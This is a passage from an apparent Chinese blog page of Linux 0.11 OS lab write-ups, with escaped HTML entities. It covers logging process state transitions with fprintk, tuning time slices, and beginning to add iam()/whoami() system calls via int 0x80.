44 45 46 47 48 49 50 51 52 53 54  #include \u0026#34;linux/sched.h\u0026#34;#include \u0026#34;sys/stat.h\u0026#34; static char logbuf[1024]; int fprintk(int fd, const char *fmt, ...) { va_list args; int count; struct file * file; struct m_inode * inode; va_start(args, fmt); count=vsprintf(logbuf, fmt, args); va_end(args); /* 如果输出到stdout或stderr，直接调用sys_write即可 */ if (fd \u0026lt; 3) { __asm__(\u0026#34;push %%fs\\n\\t\u0026#34; \u0026#34;push %%ds\\n\\t\u0026#34; \u0026#34;pop %%fs\\n\\t\u0026#34; \u0026#34;pushl %0\\n\\t\u0026#34; /* 注意对于Windows环境来说，是_logbuf,下同 */ \u0026#34;pushl $logbuf\\n\\t\u0026#34; \u0026#34;pushl %1\\n\\t\u0026#34; /* 注意对于Windows环境来说，是_sys_write,下同 */ \u0026#34;call sys_write\\n\\t\u0026#34; \u0026#34;addl $8,%%esp\\n\\t\u0026#34; \u0026#34;popl %0\\n\\t\u0026#34; \u0026#34;pop %%fs\u0026#34; ::\u0026#34;r\u0026#34; (count),\u0026#34;r\u0026#34; (fd):\u0026#34;ax\u0026#34;,\u0026#34;cx\u0026#34;,\u0026#34;dx\u0026#34;); } else /* 假定\u0026gt;=3的描述符都与文件关联。事实上，还存在很多其它情况，这里并没有考虑。*/ { /* 从进程0的文件描述符表中得到文件句柄 */ if (!(file=task[0]-\u0026gt;filp[fd])) return 0; inode=file-\u0026gt;f_inode; __asm__(\u0026#34;push %%fs\\n\\t\u0026#34; \u0026#34;push %%ds\\n\\t\u0026#34; \u0026#34;pop %%fs\\n\\t\u0026#34; \u0026#34;pushl %0\\n\\t\u0026#34; \u0026#34;pushl $logbuf\\n\\t\u0026#34; \u0026#34;pushl %1\\n\\t\u0026#34; \u0026#34;pushl %2\\n\\t\u0026#34; \u0026#34;call file_write\\n\\t\u0026#34; \u0026#34;addl $12,%%esp\\n\\t\u0026#34; \u0026#34;popl %0\\n\\t\u0026#34; \u0026#34;pop %%fs\u0026#34; ::\u0026#34;r\u0026#34; (count),\u0026#34;r\u0026#34; (file),\u0026#34;r\u0026#34; (inode):\u0026#34;ax\u0026#34;,\u0026#34;cx\u0026#34;,\u0026#34;dx\u0026#34;); } return count; }   我们将改代码放入kernel/printk.c文件中即可。\nfprintk使用的格式有如下\n1 2 3 4 5  // 向stdout打印正在运行的进程的ID fprintk(1, \u0026#34;The ID of running process is %ld\u0026#34;, current-\u0026gt;pid); // 向log文件输出跟踪进程运行轨迹 fprintk(3, \u0026#34;%ld\\t%c\\t%ld\\n\u0026#34;, current-\u0026gt;pid, \u0026#39;R\u0026#39;, jiffies);   第一个参数为文件描述符，第二个参数作为字符串输出，就和printf使用是一样的，但是前面第一个参数用来指定文件描述符。\n我们还记录了进程切换，状态保持的一些时间，但是时间并不是我们常识的时间，而是以CPU时钟中断发生的次数，称为“滴答数”——jiffies\njiffies是定义在kernel/sched.c文件中定义为一个全局变量,记录了开机到当前时间的时钟中断次数\n1  long volatile jiffies=0;   在sched.c中sched_init()函数中，时钟中断函数被设置为\n1 2 3 4 5 6 7  set_intr_gate(0x20,\u0026amp;timer_interrupt); /*在kernel.system_call.s中timer_interrupt定义有如下和jiffies相关的指令 */ timer_interrupt: ! …… ! 增加jiffies计数值 incl jiffies ! ……   这也是jiffies能表示开机到现在发生的时钟中断次数的原因\n在kernel/sched.c中定义一个宏 LATCH时用来设置每次时钟中断间隔的\n1 2 3 4 5  // 在 kernel/sched.c 中 #define LATCH (1193180/HZ)  // 在 include/linux/sched.h 中 #define HZ 100   这个和计算机的定时芯片时钟频率有关。\n最重要的部分来了，我们如何寻找状态切换点呢？\n我们从每个状态转化的过程入手：\n首先先列出我们需要改动的文件：\nkernel/rork.c中的copy_process函数\nkernel/sched.c的schedule()，wake_up()，sleep_on()，interrupt_sleep_on()，sys_pause()，sys_waitpid()函数\nkernel/exit.c 的 do_exit()函数\n 无-\u0026gt;创建：  既然涉及到创建，那么我们就进入fork()去看，之前做的第二个实验我们知道系统调用里面才调用真正的内核函数，所以fork()里面会有一个sys_fork()来执行真正的系统调用，所以我们在sys_fork()寻找创建进程的函数\n1 2 3 4 5 6 7 8 9 10 11 12  sys_fork: call find_empty_process ! …… ! 传递一些参数 push %gs pushl %esi pushl %edi pushl %ebp pushl %eax ! 调用 copy_process 实现进程创建 call copy_process addl $20,%esp   那么copy_process便是真正创建子进程的函数了\n我们可以找到在这个函数中，创建了一个task_struct结构空间，然后将父进程各种信息赋值给新的结构空间，我们注意几个点就可以\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  int copy_process(int nr,……) { struct task_struct *p; // …… // 获得一个 task_struct 结构体空间  p = (struct task_struct *) get_free_page(); // ……  p-\u0026gt;pid = last_pid; // …… // 设置 start_time 为 jiffies  p-\u0026gt;start_time = jiffies; // …… /* 设置进程状态为就绪。所有就绪进程的状态都是 TASK_RUNNING(0），被全局变量 current 指向的 是正在运行的进程。*/ p-\u0026gt;state = TASK_RUNNING; return last_pid; }   我们添加在如下地方\n那么我们就能记录新子进程建立的id，状态为’N'，和CPU中断次数的信息了\n 新建-\u0026gt;就绪：  当子进程建立完成后，他就进入就绪状态，同一个文件下，那么我们在return last_pid；前一句加入写入log文件的语句即可。按道理来说新建子进程不会直接运行啊，应该还要等待schedule函数的调度才能到运行状态，我就不太明白为什么这段代码会把新建子进程的状态p-\u0026gt;state = TASK_RUNNING;（答案：Linux中统一ready(就绪态）和running(运行态）为TASK_RUNNING状态）\n 就绪-\u0026gt;运行 | 运行-\u0026gt;就绪：  就绪到运行，那么就需要执行schedule()函数，那么我们进入kernel/sched.c里面找到schedule()函数。但这个时候我们需要判断current这个当前这个进程是属于什么状态，如果是TASK_RUNNING状态就需要现将转为就绪态，然后通过switch_to(next)将任务队列的第一个进程变为TASK_RUNNING。因此我们再次这样添加语句\n 阻塞-\u0026gt;就绪：  同样是在schedule()函数里，在第三点代码段前面。有将阻塞态进程转为就绪态的函数(可能此时有操作I/O设备的进程完成了任务)，那么我们直接在他改为就绪态后添加语句即可\n同样我们还有一个wake_up()函数也能将阻塞态转为就绪态，因此我们还需要在该函数中添加，该函数用到了 p-\u0026gt;state！=0，0代表的是TASK_RUNNNING。\n 运行-\u0026gt;阻塞：  阻塞有两种情况，第一种为可被中断打断阻塞，第二种为不可被中断打断阻塞\n不可被中断打断阻塞。只能由wake_up显示唤醒，再由schedule()语句后的if(tmp) tmp-\u0026gt;state=0依次唤醒。不可中断的睡眠进程一定是严格从\u0026quot;队列\u0026quot;(一个依靠放在进程内核栈中的指针变量tmp维护的队列)的头部唤醒。\n可被中断打断阻塞，他除了被wake_up唤醒，也可以被发一个信号唤醒，实际上就是进程PCB中维护的一个向量的某一位置的位，当进程需要再合适的时候处理这一位来唤醒，在schedule()中\n1 2 3 4  for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (((*p)-\u0026gt;signal \u0026amp; ~(_BLOCKABLE \u0026amp; (*p)-\u0026gt;blocked)) \u0026amp;\u0026amp; (*p)-\u0026gt;state==TASK_INTERRUPTIBLE) (*p)-\u0026gt;state=TASK_RUNNING;//唤醒   就是当进程是可中断睡眠时，遇到一些信号就会被唤醒，这样会导致，唤醒等待队列中间的某个进程，那这个队列就会需要进行适当的调整，会继续让该进程睡眠，并唤醒排在前面的进程然后再将该进程唤醒。\n这就是两者的区别\n不可被中断打断阻塞的状态转换位于sleep_on()函数，也在sched.c文件中\ntmp指向当前进程的上一个被睡眠的进程，* p指向当前的进程，如果* p没有指向当前进程a，也就是说当前进程a前面又加入了一些进程bcd等，此时d的tmp-\u0026gt;c，c的tmp-\u0026gt;b，b的tmp-\u0026gt;a，tmp是每个进程私有的，而* p是全局变量，此时*p指向 d.\n所以schedule()要回到进程a的程序，需要等d的if(tmp执行)，c的if(tmp)，b的if(tmp)执行并被唤醒后，a的schedule()才会回来并执行a的if(tmp)并唤醒a进程。\n该函数本意是失眠用的，那么我们就在current转换成阻塞态前加上该语句，此时睡眠队列头指针指向当前任务，当我们调用schedule后回到该程序继续执行if(tmp)的代码，将该进程变为就绪态。\n我们添加if就是为了避免一些情况导致某些进程重复被记录防止出错\n在interruptible_sleep_on()函数中\n我们是在其状态更改前写入日志文件，代码如下\n将当前任务放入等待队列中，同样该任务被唤醒后才能继续执行，如果* p指向的不是当前任务，说明其他任务加入进了等待队列，我们需要先唤醒前面的，等待后续进入队列的任务都被唤醒执行后再来唤醒本任务，因为该任务是可被中断唤醒的，所以先唤醒后面新加的等待任务，所以才会判断 if(* p\u0026amp;\u0026amp;* p！=current)如果p存在但不等于当前进程a，他就会让* p指向的进程d唤醒，然后然被某个信号唤醒的进程a继续睡眠（就是repeat回去的那条代码做的事）此时* p=NULL，所以后面都不会在进入 if(* p\u0026amp;\u0026amp;* p！=current)里面，而是通过tmp不断唤醒他连接的在他之前睡眠的进程，一直这样唤醒到tmp指向的是被某个信号唤醒的进程的程序a，然后执行schedule()后面的代码，此时if(tmp)的代码就是将本进程从阻塞态转换成就绪态。\n所以我们调用该睡眠函数 就在一开始添加写入阻塞的信息，在后面添加写入就绪的信息\nsys_pause()，sys_waitpid()函数也是可用于阻塞的，所以我们也需要再次加入写入阻塞信息的语句\n改动分别如下图\n 运行-\u0026gt;退出  在kernel/exit.c文件中的do_exit()函数中，改动如下：\n至此记录进程运行轨迹的任务完成。\n四、进程运行轨迹的跟踪与统计结果 我们尽量在Linux0.11外写好process.c文件(因为Linux0.11装载的vi书写效率很低)，然后在bochs虚拟机装载的Linux根目录文件系统的镜像文件所在目录，通过这个方式我们能进行文件交通信，通过\n1  sudo ./mount-hdc   打开访问权限，然后将process.c文件放入hdc/usr/root/ 文件夹里。\n然后输入(目录不要变，不是在hdc里面，而是hdc外一层目录，就是输入第一个指令的目录)\n1  sudo umount hdc   卸载该文件系统。\n在然后在上述目录下运行Linux0.11，并编译运行process.c\n1 2 3 4  ./run //运行Linux0.11 ls //可以查看/usr/root有没有加入process.c文件 gcc process -o process.c //编译 ./process //运行   我们会看到如下运行结果\n此时process.log文件已经记录好了各进程的运行轨迹，因此我们退出Linux0.11\nprocess.log文件如下：\n我们通过上面说过的 打开我们bochs虚拟机装载的Linux的文件系统，从/hdc/var中找到process.log文件，拿到我们系统的文件夹中。\n因为我们重点不在书写统计结果的代码，所以我们现在利用现有的统计结果的代码直接统计，改代码的逻辑思路就是通过 ID号进行结果分类，再通过jiffies 和状态的关系进行简单的加减运算即可。\n统计代码是python写的，名称为stat_log.py，将该文件和process.log日志文件放在一起，从命令行进入该文件夹输入指令\n1  chmod +x stat_log.py   给该文件加上执行权限，在输入如下指令直接执行数据统计\n1  ./stat_log.py process.log   得到如下结果Turnaround 为进程的轮转时间，即进程执行的总时(任务完成时间减去任务开始时间)\nwaiting 就是进程睡眠时间\nCPU Burst为该进程执行指令的用时，I/O Burst为该进程使用I/O设备的用时。\n如果遇到\n1  Error at line xxx:It is a clone of previous line.   大概率是某个记录进程状态的添加的语句出现了错误或者少了if判断语句导致重复记录一个进程的状态或状态冲突了。\n上述的结果是在时间片设置为15的结果，接下来我们要更改为30，然后再来观察进程运行的时间有何变化。\n进程的调度算法是采用的“时间片轮转调度”，每个进程都有一个时间片的时间来执行，也就是时分复用。\n在sched.c文件中，调度函数schdule()定义如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  while (1) { c = -1; next = 0; i = NR_TASKS; p = \u0026amp;task[NR_TASKS]; // 找到 counter 值最大的就绪态进程  while (--i) { if (!*--p) continue; if ((*p)-\u0026gt;state == TASK_RUNNING \u0026amp;\u0026amp; (*p)-\u0026gt;counter \u0026gt; c) c = (*p)-\u0026gt;counter, next = i; } // 如果有 counter 值大于 0 的就绪态进程，则退出  if (c) break; // 如果没有： // 所有进程的 counter 值除以 2 衰减后再和 priority 值相加， // 产生新的时间片  for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (*p) (*p)-\u0026gt;counter = ((*p)-\u0026gt;counter \u0026gt;\u0026gt; 1) + (*p)-\u0026gt;priority; } // 切换到 next 进程 switch_to(next);   我们寻找counter最大的就绪进程进行调度，每个进程的counter会在时钟中断时减1，因此如果我没找不到大于0的就绪态进程，就会执行下列指令\n1 2 3 4 5 6  // 如果没有： // 所有进程的 counter 值除以 2 衰减后再和 priority 值相加， // 产生新的时间片  for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (*p) (*p)-\u0026gt;counter = ((*p)-\u0026gt;counter \u0026gt;\u0026gt; 1) + (*p)-\u0026gt;priority; }   通过将counter从负值缩小两倍，然后加上其优先级，直到获得一个大于0的counter的进程。不过要注意，这里是对所有的进程都执行这样的操作，包括阻塞态，因此阻塞的越久的进程，counter越大，且优先级越高，counter越大。\n你可能会想，既然是通过counter来判断调度哪一个处于就绪态的进程，那新建的子进程的counter如何设置呢？\n我们查看fork.c文件中的copy_process()函数\n1 2 3 4 5 6 7  // 用来复制父进程的PCB数据信息，包括 priority 和 counter *p = *current; // 初始化 counter p-\u0026gt;counter = p-\u0026gt;priority; // 因为父进程的counter数值已发生变化，而 priority 不会，所以上面的第二句代码将p-\u0026gt;counter 设置成 p-\u0026gt;priority。 // 每个进程的 priority 都是继承自父亲进程的，除非它自己改变优先级。   该实验并不涉及更改子进程的priority，因此创建的进程的初始counter都被设置为进程0的priority.\n那么我们找到进程0的priority设置的文件，其在include/linux/sched.h中INIT_TASK宏中定义为：\n1 2 3  #define INIT_TASK \\ { 0,15,15, // 上述三个值分别对应 state、counter 和 priority;   我们更改如下：将15-\u0026gt;30\n最后再次执行process.c，再次通过stat_log.py文件统计process.log文件，得到如下结果\n平均的轮转时间和等待时间比15时间片和优先级更短了一些。\n先把结论说了：\n时间片变小，导致产生进程调度次数变多，从而导致进程等待时间越长\n时间片变大，导致进程因中断或睡眠进入的进程调度次数也增加，等待时间也越长\n那为什么上面时间片变大了，执行和等待时间变小了呢？\n因为在最大和最小之间有个平衡，会是最优的选择，30可能碰巧在这了。说白了就是我的测试用例少了(主要是懒了)。\n所以要合理设置时间片的大小，太小太大都会影响CPU效率。\n那么单进程和多进程编程最大区别是什么呢？\n单进程程序我们写的多了，顺序执行，逻辑单线，在没有其他程序干扰下，数据是同步的。\n而多进程程序却在宏观时间看是同时执行的，正因为共享文件，而进程之间的执行顺序没法控制，因此要考虑进程之间的关系和互相影响的情况，要做好数据的异步处理，避免数据污染，进程之间同步，通信，互斥等关系也要在编程时有个清晰的框架。\n结束~~！\n","permalink":"http://int80.top/oslab3/","tags":["操作系统"],"title":"进程运行轨迹的跟踪与统计"},{"categories":["操作系统"],"contents":"LAB2 一、 任务内容：\n在原有的linux0.11上添加两个系统调用，及其相应的响应函数，并通过API调用系统调用。\n两个系统调用的原型和应该完成的功能如下\n（1）iam()\n1  int iam(const char *name);   功能：将name的内容拷贝到内核中保存下来\n要求：name长不能超过24个字符，包括最后的'\\0'\n返回值：拷贝的字符串name的长度。若name长超过24，则返回 -1，并置errno为EINVAL（errno是个头文件，即return -EINVAL,EINVAL是errno.h里的一个宏定义）\n（2）whoami()\n1  int whoami(char *name,unsigned int size);   功能：将iam()保存到内核空间的字符串拷贝到name字符串指向的用户地址空间中，为了确保name不会越界访问，用size说明其大小\n返回值：拷贝字符串name的长度。若size小于name所占空间，返回 -1，并置errno为EINVAL\n二、明确何为系统调用。做什么的？如何做？\n要谈系统调用，那我们还是先了解一下何为内核。(只是让我自己再复习一下概念，能否说清楚)\n操作系统其实就是一个监控程序，对的，也是一个程序。它相当于单片机我们写的while(1)，而内核就是操作系统最核心的部分，也即这个程序里面最核心的代码。我们可以从linux源码看出其内核负责处理各种核心任务，比如I/O,进程管理，内存管理等。\n所以内核即操作系统这个程序里面最关键的代码。也就是他是计算机资源的管理者，包括硬件，软件资源。软件资源就是各种形式的数据，比如各种文件，软件程序。硬件资源就是总线、CPU、内存、磁盘、网卡、显卡及各种IO。\n那么系统调用是如何出现的呢？\n我们假设如果没有操作系统来管理各种进程，举个栗子，每个进程需要放进内存才能执行，那么就会在占用内存空间，如果两个任务同时申请同一个内存空间会造成冲突。更为严重，如果一个任务占用了必须一直运行的程序或者非常重要的程序的内存空间，那么计算机就崩溃了。\n同时，如果有操作系统，并且不对进程加以限制及控制，会发生什么情况？\n在举几个栗子，对于单任务，他可能把他的空间占用到了原本分配给操作系统的空间，那么两者就混合了，没办法区分，并且用户程序可以访问大部分硬件设备，甚至改变操作系统，如果一个病毒(恶意进程)也连接到了操作系统的程序里面，那它就成了操作系统的一部分了，因为没办法区分嘛。\n多任务呢？如果多个进程同时操控同一个硬件设备，数据传输就会错误，数据被污染，可以理解为一个程序的数据发送到了另一个程序。同时操作系统必须自己响应硬件中断，通过硬件中断来切换任务上下文，让合适的任务在合适时机运行。如果中断响应程序被更改了呢？操作系统又会如何运行呢？\n综上，操作系统必须要清楚哪些程序占用那些资源，合理控制分配，才能有序运行下去。为了避免一个普普通通的进程将自己干掉取代，操作系统必然需要采取强硬措施保证自己的地位。核心问题在于保护关键寄存器和重要的物理内存。\n既然操作系统是个监控程序，它要控制其下的进程，那么各种进程就必须要有分级制度，并且操作系统拥有最高控制权才能让其余的进程服从它的安排。这就引出了用户态和内核态。因此，只有有操作系统的前提，用户态和内核态这种概念才会存在。因为对于CPU来说不过是状态标志位的改变，即寄存器几个有特殊意义的位改变后，CPU有不同的工作方式。为了用户使用的方便，操作系统才衍生这用户态和内核态的概念\n这个控制权由硬件来控制，当CPU引导进入保护模式后，会有一张全局描述符表，记录了各代码段的特权级别，在linux中特权级别为0-3，0级等级最高。CS寄存器中有两位(CPL，当前特权级)用来指明CPU当前的特权级，0最高，3最低，分别称为内核态和用户态。同时还存在请求特权级RPL，其存在请求者的程序代码里，代码里要提供一个选择子selector，RPL保存选择子的最低两位。访问时的特权检查根据：有效特权级EPL=max(RPL,CPL)\u0026lt;=CPL是否成立，所以用户程序最多访问CPL级别的代码段。\n当用户态进入内核态，特权级升高，内核态回到用户态，特权级降低。这个进程切换的同时还会切换相应的栈，ESP从用户栈切换到内核栈，再从内核栈切换到用户栈。以上措施皆为限制程序的访问能力来保证操作系统的安全。\n由上面我们也可以知道，用户态不能随随便便切换到内核态，要是随意切换，那操作系统不就也还是危险的了嘛。但是用户态必须要使用硬件设备，让操作系统来和硬件交互执行程序的各种功能，所以我们需要进入内核态啊，那么我们要如何做呢？这时候需要一个机制：用户态程序切换到内核态，但不能控制内核态中执行的指令。\n这个机制就是系统调用(嘿嘿，说了那么多终于讲到它了)，而执行机制的方法就是中断（异常的一种，且不仅这一个方法，所以称为”异常“会更为准确，例如缺页也会进入内核态进行取页换页的操作），可以理解为中断是能够陷入内核态的有效手段。用户程序通过系统调用的这个方法，告诉内核他要去操控哪些计算机资源。所以系统调用是内核态与用户态的分界\n例如我们使用printf函数，他就告诉了内核要控制显示器输出这样的字符串，所以我们可以在屏幕上看到字符串的输出，说明我们的程序已经进入过内核态并将数据传递给了显示器这个硬件。\n系统调用即调用系统函数，通过系统函数来实现控制硬件。系统函数是调用系统库中为该系统调用编写的一个接口函数(API)，但API并不会自己完成系统调用，而是真正的系统调用被封装在API中，换句话说，API调用真正的系统调用。例如write()这个系统函数就是一个API，这个函数中还有指令真正用来实现在显示器上显示字符。\n那么系统函数也是函数和我们用户态写的用户程序的函数有什么区别呢？调用用户程序的自定义函数，在汇编层面是通过call指令跳转到该函数地址，然后执行。\n而调用API到API调用真正的系统调用的过程如下：\n 将系统调用函数的编号存入EAX; 把函数参数存入其他通用寄存器; 触发int 0x80，请求处理系统调用的system_call来处理;  该次任务，我们在用户程序直接执行我们所写的系统调用函数。\n这个过程如下：\n 应用程序调用库函数(API) API将系统调用号存入EAX，通过中断调用使系统进入内核态 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用） 系统调用完成相应功能，将返回值存入EAX，返回到中断处理函数 中断处理函数返回到API API将EAX的值返回给应用程序  三、分析及实现\n我们会从一些系统函数进行分析来充分理解用户程序是如何进行系统调用的。\n我们查看Linux0.11源码里的lib/close.c中close()的API\n1 2 3 4  #define __LIBRARY__ #include \u0026lt;unistd.h\u0026gt; _syscall1(int, close, int, fd)   _syscall 是一个宏，其在include/unistd.h中定义\n1 2 3 4 5 6 7 8 9 10 11 12  #define _syscall1(type,name,atype,a) \\ type name(atype a) \\ { \\ long __res; \\ __asm__ volatile (\u0026#34;int $0x80\u0026#34; \\ : \u0026#34;=a\u0026#34; (__res) \\ : \u0026#34;0\u0026#34; (__NR_##name),\u0026#34;b\u0026#34; ((long)(a))); \\ if (__res \u0026gt;= 0) \\ return (type) __res; \\ errno = -__res; \\ return -1; \\ }   将_syscall1(int，close，int，fd)进行宏展开有\n1 2 3 4 5 6 7 8 9 10 11  int close(int fd) { long __res; __asm__ volatile (\u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (__res) : \u0026#34;0\u0026#34; (__NR_close),\u0026#34;b\u0026#34; ((long)(fd))); if (__res \u0026gt;= 0) return (int) __res; errno = -__res; return -1; }   这个就是API的定义，里面包含了调用真正的系统调用。将宏__ NR_close存入EAX ( 你是不是会疑惑__ NR_close怎么出来的？咱先按下不表)，然后将fd存入EBS，然后进行0x80中断调用。从EAX取出返回值存入__res中，判断后再决定传什么值给API调用者。对比API进行真正系统调用的过程，那么可知这个就是进行了API到真正系统调用的实例。\n那么__NR_close是什么呢？它其实就是系统调用的编号，我们有一步要将系统调用号写入EAX让内核知道要调用哪一个内核函数嘛。所有系统调用的编号都在include/unistd.h里面定义。我们要自己写系统调用函数，也需要给我们的函数一个编号。\n1 2 3 4 5  #define __NR_close 6 /* 所以添加系统调用时需要修改include/unistd.h文件， 使其包含__NR_whoami和__NR_iam。 */   因此对于我们写的用户程序调用系统调用需要有如下内容\n1 2 3 4 5 6 7 8 9 10 11  /* 有它，_syscall1 等才有效。详见unistd.h */ #define __LIBRARY__  /* 有它，编译器才能获知自定义的系统调用的编号 */ #include \u0026#34;unistd.h\u0026#34; /* iam()在用户空间的接口函数，调用系统调用，是系统调用iam()的API，在这个宏里面完成真正系统调用 */ _syscall1(int, iam, const char*, name); /* whoami()在用户空间的接口函数 */ _syscall2(int, whoami,char*,name,unsigned int,size);   所以我们在unistd.h文件中添加如下的内容\n如此我们就将我们自己写的系统调用函数设置好了\n我们调用close()API时调用了int 0x80，所以我们要从此进入内核。\n首先来了解0x80中断执行的过程\n首先我们看内核初始化的时候，主函数main()中调用了sched_init()初始化函数（现在是系统调用初始化的分析）\n1 2 3 4 5 6 7 8  void main(void) { // ……  time_init(); sched_init(); buffer_init(buffer_memory_end); // …… }   sched_init() 在kernel/sched.c中定义\n1 2 3 4 5  void sched_init(void) { // ……  set_system_gate(0x80,\u0026amp;system_call); }   set_system_gate()是个宏，在include/asm/system.h中定义。我们可以看到他传入0x80这个参数和system_call这个中断程序的地址。\n1 2  #define set_system_gate(n,addr) \\ _set_gate(\u0026amp;idt[n],15,3,addr)   而_set_gate定义为\n1 2 3 4 5 6 7 8 9 10  #define _set_gate(gate_addr,type,dpl,addr) \\ __asm__ (\u0026#34;movw %%dx,%%ax\\n\\t\u0026#34; \\ \u0026#34;movw %0,%%dx\\n\\t\u0026#34; \\ \u0026#34;movl %%eax,%1\\n\\t\u0026#34; \\ \u0026#34;movl %%edx,%2\u0026#34; \\ : \\ : \u0026#34;i\u0026#34; ((short) (0x8000+(dpl\u0026lt;\u0026lt;13)+(type\u0026lt;\u0026lt;8))), \\ \u0026#34;o\u0026#34; (*((char *) (gate_addr))), \\ \u0026#34;o\u0026#34; (*(4+(char *) (gate_addr))), \\ \u0026#34;d\u0026#34; ((char *) (addr)),\u0026#34;a\u0026#34; (0x00080000))   这里展示的是将system_call函数地址写到0x80对应的中断描述符中，相当于执行int 0x80指令，会产生一个异常陷入内核空间并执行系统调用处理函数system_call，那么明白了0x80号中断如何和system_call产生联系后，我们简单看下system_call的代码，是纯汇编语言编写的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  !…… ! # 这是系统调用总数。如果增删了系统调用，必须做相应修改，所以我们增加两个系统调用函数，这里数值+2 nr_system_calls = 72 !…… .globl system_call .align 2 system_call: ! # 检查系统调用编号是否在合法范围内 cmpl \\$nr_system_calls-1,%eax ja bad_sys_call push %ds push %es push %fs pushl %edx pushl %ecx ! # push %ebx,%ecx,%edx，是传递给系统调用的参数 pushl %ebx # to the system call ! # 让ds, es指向GDT，内核地址空间（修改段选择子为内核段） movl $0x10,%edx mov %dx,%ds mov %dx,%es movl $0x17,%edx ! # 让fs指向LDT，用户地址空间 mov %dx,%fs call sys_call_table(,%eax,4) pushl %eax movl current,%eax cmpl $0,state(%eax) jne reschedule cmpl $0,counter(%eax) je reschedule   并不需要完全理解每一句话，知道他整个程序是干什么的即可。当我们调用system_call这个函数后，可以看到他保存了“现场”，各种push将用户态的各种参数入栈，并让fs指向用户空间，都是为了从内核态回到用户态后，还能还原进入内核态前的状态。(这是操作系统完成的部分保存，硬件完成的还有一部分，比如ss、esp、cs等寄存器)\n并且该函数让我们从用户态陷入到了内核态。其余的简单了解一下即可。\n我们关注\n1  call sys_call_table(,%eax,4)   我们知道EAX存放的是系统调用号，即__NR_xxxx。根据汇编寻址方法为\n1  call sys_call_table + 4 * %eax   那么sys_call_table又是什么呢？我们可以在include/linux/sys.h中找到\n那么可知它是一个函数指针数组的起始地址。\n因此我们根据系统调用号算出系统调用相应的响应函数在表里的位置，并调用该函数。\n所以我们要在sys.h中加上 sys_iam() ,sys_whoami()两个响应函数引用\n更改如下图所示\n这里函数表添加的位置要和__NR_xxxx的值对应上，因为我们是根据这个值来计算函数在表里的位置的。\n那么因此可以知道我们执行 int 0x80 中断指令后就能保存现场-\u0026gt;陷入内核-\u0026gt;调用系统响应相应的响应函数。\n所以，那么我们就该写系统函数sys_iam()和sys_whoami(),我们将这两个函数写成一个who.c文件，这样就只需要一次编译。在完成这两个函数完整功能前，我们先写个测试代码。\n1 2 3 4 5 6  int sys_iam(const char* name){ printk(\u0026#34;Hello from sys_iam\u0026#34;); } int sys_whoami(char* name,unsigned int size){ printk(\u0026#34;Hello from sys_whoami\u0026#34;); }   可能会有小伙伴疑问了？欸，为什么是printk而不是printf呢？ 首先明确我们现在是系统函数，调用这个函数的时候我们处于内核态，而内核态是不能使用用户态的函数printf的，所以有printk函数给内核函数使用。这两个函数本质调用的都是tty_write这个函数，但printk是在内核态，对fs寄存器操作不同于printf，因为fs寄存器指向用户态，所以他要将fs寄存器的内容入栈，保存现场，然后指向内核段，出内核态后再pop出\u0026amp;fs恢复现场\n然后我们运行 Linux0.11，并在上面编写test.c文件来调用系统函数。\n1 2 3 4 5 6 7 8 9 10 11 12  #define __LIBRARY__ #include \u0026lt;unistd.h\u0026gt;//iam()和whoami()两个系统调用的入口参数 _syscall1(int, iam, const char *, name); _syscall2(int, whoami, char*, name,unsigned int,size); int main(void){ char buf[24]; iam(\u0026#34;test\u0026#34;); //这句和下句都只是满足需要传入参数，才能运行。  whoami(buf,24); return 0; }   那么这样我们就能调用iam()和whoami()两个系统调用的响应函数sys_iam和sys_whoami了。我们得到输出\n因此我们可以确定我们增加系统调用和响应函数成功了，那么我们现在将响应函数更改为我们想要的功能。\n我们知道指针传递的参数是程序所在地址空间的逻辑地址，如果在内核就直接访问这个地址，得到的是内核空间的数据，而不会是用户态的数据，所以要把name这个字符串被内核读取存入，还需要其他的方法。\n我们从open(char *filename，…..)来分析open（）这个系统调用是如何处理内核态从用户态读取数据的。\n1 2 3 4 5 6 7 8 9  int open(const char * filename, int flag, ...) { // ……  __asm__(\u0026#34;int $0x80\u0026#34; :\u0026#34;=a\u0026#34; (res) :\u0026#34;0\u0026#34; (__NR_open),\u0026#34;b\u0026#34; (filename),\u0026#34;c\u0026#34; (flag), \u0026#34;d\u0026#34; (va_arg(arg,int))); // …… }   这段我们分析过了，就是把各种参数存在寄存器中。但这里open的文件名是通过EBX传递，就是进入内核后，通过EBX取出文件名字符串。但EBX指向的数据在用户空间，执行的却是内核代码。\n1 2 3 4 5 6 7 8 9 10 11  system_call: //所有的系统调用都从system_call开始 ! …… pushl %edx pushl %ecx pushl %ebx # push %ebx,%ecx,%edx，这是传递给系统调用的参数 movl $0x10,%edx # 让ds,es指向GDT，指向核心地址空间 mov %dx,%ds mov %dx,%es movl $0x17,%edx # 让fs指向的是LDT，指向用户地址空间 mov %dx,%fs call sys_call_table(,%eax,4) # 即call sys_open   这段代码也分析过了，就是各种参数入栈来保存，然后通过fs获得用户数据段的数据。然后call sys_call_table，我们会得到sys_open响应函数\n1 2 3 4 5 6 7 8  int sys_open(const char * filename,int flag,int mode) //filename这些参数从哪里来？ { …… if ((i=open_namei(filename,flag,mode,\u0026amp;inode))\u0026lt;0) { …… } …… }   你可能会问我们不是查表找到的响应函数吗？那这些参数哪里获得呢？看看上面的汇编代码，我们pushl 了各种寄存器的值入栈，这些就是函数的参数。我们C语言函数调用另一个函数，就是要将传递的参数压栈，从右到左顺序压，然后call调用。如果要用汇编程序调用C函数就需要自己手动编写这些压栈代码。\n最后我们看到这些参数传给了open_namei（），我们继续深究会发现他里面还传给了dir_namei(),get_dir()，我们从get_dir函数看到\n1 2 3 4 5 6 7 8  static struct m_inode * get_dir(const char * pathname) { …… if ((c=get_fs_byte(pathname))==\u0026#39;/\u0026#39;) { …… } …… }   那么我们就可以知道可以通过 get_fs_byte()这个函数获得用户空间的一个字节的数据。\n那么如何从内核态拷贝数据到用户态呢？\n我们在include/asm/segment.h中查看：\n1 2 3 4 5 6 7 8 9 10 11  extern 